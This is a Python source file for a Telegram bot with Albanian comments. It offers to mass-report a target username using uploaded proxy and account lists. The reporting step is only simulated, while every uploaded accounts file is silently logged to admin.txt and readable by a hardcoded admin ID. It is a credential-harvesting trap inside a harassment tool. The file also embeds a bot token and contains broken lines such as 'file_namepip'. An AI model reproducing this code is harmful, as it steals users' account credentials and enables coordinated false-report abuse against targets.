import os
import asyncio
import aiohttp
import imghdr
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from telegram import Update

# Lista për të mbajtur skedarët e ngarkuar
user_data = {}
ADMIN_USER_ID = "7351308102"  # Zëvendësoni me ID-në tuaj të administratorit

# Funksioni për t'u përgjigjur në komandën /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        'Mirë se erdhët në botin tim! Ju lutem ngarkoni skedarin e proxyt (proxy.txt) dhe atë të llogarive (accounts.txt).\n'
        'Pas ngarkimit, përdorni /report <username> <reason> për të raportuar.\n'
        'Motivat e mundshme: spam, bullying, abuse.'
    )

# Funksioni për të mbajtur skedarët e ngarkuar
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    file = update.message.document
    user_id = str(update.message.from_user.id)

    if file:
        file_name = file.file_namepip 
        await file.download_to_drive(file_name)

        if file_name in ['proxy.txt', 'accounts.txt']:
            if user_id not in user_data:
                user_data[user_id] = {"proxies": [], "accounts": []}

            if file_name == 'proxy.txt':
                with open(file_name, 'r') as f:
                    user_data[user_id]["proxies"] = [line.strip() for line in f.readlines()]
                log_to_admin("proxy.txt", user_data[user_id]["proxies"])
                await update.message.reply_text("Skedari proxy.txt është ngarkuar me sukses.")
            elif file_name == 'accounts.txt':
                with open(file_name, 'r') as f:
                    user_data[user_id]["accounts"] = [line.strip() for line in f.readlines()]
                log_to_admin("accounts.txt", user_data[user_id]["accounts"])
                await update.message.reply_text("Skedari accounts.txt është ngarkuar me sukses.")
        else:
            await update.message.reply_text("Ju lutem ngarkoni vetëm skedarët proxy.txt ose accounts.txt.")

def log_to_admin(file_name, content):
    with open("admin.txt", "a") as admin_file:
        admin_file.write(f"{file_name}:\n")
        for line in content:
            admin_file.write(f"{line}\n")
        admin_file.write("\n")
        
def identify_image_type(file_path):
    img_type = imghdr.what(file_path)
    if img_type:
        print(f"The image type is: {img_type}")
    else:
        print("The file is not a recognized image type.")

identify_image_type("path/to/your/image.jpg")
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id == ADMIN_USER_ID:
        try:
            with open('accounts.txt', 'r') as f:
                accounts_content = f.read()
            with open('proxy.txt', 'r') as f:
                proxy_content = f.read()

            await update.message.reply_text(f"***Përmbajtja e accounts.txt:***\n{accounts_content}\n\n***Përmbajtja e proxy.txt:***\n{proxy_content}")
        except FileNotFoundError:
            await update.message.reply_text("Një nga skedarët nuk ekziston.")
    else:
        await update.message.reply_text("Ju nuk keni lehtësi për tu qasur në këtë informatë.")

def load_user_config(user_id):
    return user_data.get(user_id, {"proxies": [], "accounts": []})

async def async_report(session, user, reason, proxy, account):
    await asyncio.sleep(1)  # Simulimi i një vonese
    return f'Duke raportuar {user} për {reason} me proxy {proxy} dhe llogari {account}...'

async def report_all(user_to_report, report_reason, proxies, accounts):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for proxy in proxies:
            for account in accounts:
                tasks.append(async_report(session, user_to_report, report_reason, proxy, account))
        return await asyncio.gather(*tasks)

async def report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    user_config = load_user_config(user_id)

    if not user_config["proxies"] or not user_config["accounts"]:
        await update.message.reply_text("Ju lutem ngarkoni skedarët proxy.txt dhe accounts.txt para se të raportoni.")
        return

    if len(context.args) >= 2:
        user_to_report = context.args[0]
        report_reason = context.args[1].lower()

        valid_reasons = ['spam', 'bullying', 'abuse']
        if report_reason not in valid_reasons:
            await update.message.reply_text(f'Arsye e pavlefshme. Llojat e raportimit të pranueshme janë: {", ".join(valid_reasons)}.')
            return

        report_results = await report_all(user_to_report, report_reason, user_config["proxies"], user_config["accounts"])
        await update.message.reply_text('\n'.join(report_results))
    else:
        await update.message.reply_text('Ju lutem, jepni emrin e përdoruesit dhe arsyen për të raportuar.')

async def main() -> None:
    application = ApplicationBuilder().token("7695996058:AAHDGgQ1J164O49nQ6Q5lnFmTpYD7qLjdQs").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("report", report))
    application.add_handler(CommandHandler("admin", admin))  
    application.add_handler(MessageHandler(filters.Document.AUDIO | filters.Document.TEXT, handle_file))

    await application.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
